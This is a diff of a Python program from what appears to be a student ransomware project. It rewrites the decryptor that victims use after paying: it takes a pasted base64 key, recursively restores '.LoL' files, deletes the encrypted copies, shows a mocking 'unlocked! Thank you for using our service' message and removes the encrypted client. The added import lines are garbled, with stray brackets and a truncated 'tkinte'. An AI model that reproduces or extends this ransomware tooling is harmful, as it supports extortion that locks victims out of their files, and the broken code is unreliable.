@@ -1,9 +1,9 @@
-import telegram, asyncio                    #텔레그램 송수신용
-from nacl.public import PrivateKey, PublicKey, Box     #공개키암호
+import telegram, asyncio             ]
+from nacl.public import PrivateKey, PublicKey, Box]
 import nacl, nacl.secret
-from datetime import datetime               #시간정보
-from time import sleep                      #딜레이
-import os, sys, ctypes, tkinter                              #파일 내부 디렉토리
+from datetime import datetime]
+from time import sleep
+import os, sys, ctypes, tkinte
 from tkinter import messagebox
 from threading import Thread
 import threading
@@ -15,7 +15,7 @@ import base64
 
 #0. 기본 환경설정
 AES_BOX=0
-EncryptModule=0
+DecryptModule=0
 PRIVATE_KEY_AES=0
 
 MaxThread=120
@@ -27,15 +27,25 @@ PathList_DEBUG=[]
 
 entry=0
 
-def setEncryptModule(privateKeyAES):
-    global EncryptModule
+filePath='./Client_after_enc.py'
 
-    EncryptModule=nacl.secret.SecretBox(privateKeyAES)
+def setDecryptModule(privateKeyAES):
+    global DecryptModule
+    DecryptModule=nacl.secret.SecretBox(privateKeyAES)
     
-class EnDecryptor:
-    def __init__(self, files=0, encryptModule=0):
+class Decryptor:
+    def __init__(self, files=0, decryptModule=0):
         self._files=files
-        self._encryptModule=encryptModule
+        self._decryptModule=decryptModule
+
+    def decEach(self, path):
+        originName=path.strip(".LoL")
+        with open(path, "rb") as File:
+            data=File.read()
+        decryptedFile=self._decryptModule.decrypt(data)
+        with open(originName, "wb") as File:
+            File.write(decryptedFile)
+        os.remove(path)
 
     def decryptFile(self):
         try:
@@ -43,14 +53,13 @@ class EnDecryptor:
                 if(os.path.isfile(file)==True):
                     if(file==sys.argv[0]):
                         return
-                    originName=file.strip(".LoL")
-                    with open(file, "rb") as File:
-                        data=File.read()
-                    decryptedFile=self._encryptModule.decrypt(data)
-                    with open(originName, "wb") as File:
-                        File.write(decryptedFile)
-                    os.remove(file)
-
+                    if(os.path.getsize(file)>50000000):
+                        th=Thread(target=self.decEach(file))
+                        ThreadPool.append(th)
+                        th.start()
+                        
+                    else :
+                        self.decEach(file)
         except Exception as e:
             print(f"[DEBUG] Error on EnDecrypt.decryptFile(): {e}")
 
@@ -63,7 +72,7 @@ def listUpTargetDir():
     #        PathList.append(drive)
     #PathList.remove("c:\\")
     #print(f"[DEBUG] PathList: {PathList}")
-    PathList_DEBUG=["E:\\github\\-ransomware\\최지웅\\StarCraft"]#테스트용 타겟 경로"E:\\github\\-ransomware\\최지웅\\test"
+    PathList_DEBUG=["E:\\github\\-ransomware\\최지웅\\StarCraft"]
 
 
 def recursiveDecrypt(basepath):
@@ -77,33 +86,28 @@ def recursiveDecrypt(basepath):
             dirs.append(absolutePath)
 
     if (len(files)>0):
-        #th=Thread(target=EnDecryptor(files, EncryptModule).decryptFile())
-        #ThreadPool.append(th)
-        #th.start()
-        EnDecryptor(files, EncryptModule).decryptFile()
+        Decryptor(files, DecryptModule).decryptFile()
     for dir in dirs:
         recursiveDecrypt(dir)
 
 #복호화
-def decryptComputer(): #여기서 프로그램 분리시켜야할듯. 현재 이미 AES가 있음.
+def decryptComputer():
     global entry
     buf=entry.get()
-    print('[DEBUG] entry입력값',type(buf),": "+buf, len(buf))
     AESKey=base64.b64decode(buf)
-    print('[DEBUG] AESKey입력값',type(AESKey),": ",AESKey)#이거 모듈 생성 시 키값이 객체로 들어가야하지 않나? 아니네
     try:
-        setEncryptModule(AESKey)
-    
+        setDecryptModule(AESKey)
+        print("Start Decryption... Do not turn off computer...")
         for drive in PathList_DEBUG:
-            print('[DEBUG] 복호화 시작')
             start=time.time()
-            recursiveDecrypt(drive)#암호화 수행
+            recursiveDecrypt(drive)
             while (len(ThreadPool)!=0):
                 th=ThreadPool.pop()
                 th.join()
-                print("[DEBUG] join")
             end=time.time()
-            print("[DEBUG] 복호화 완료_ 복호화 시간", end-start,' seconds')
+        print("User computer is unlocked! Thank you for using our service:):):):):) Bye!")
+        sleep(10)
+        os.remove(filePath)
     except Exception as e:
         print("AESKey is not correct!", e)
 
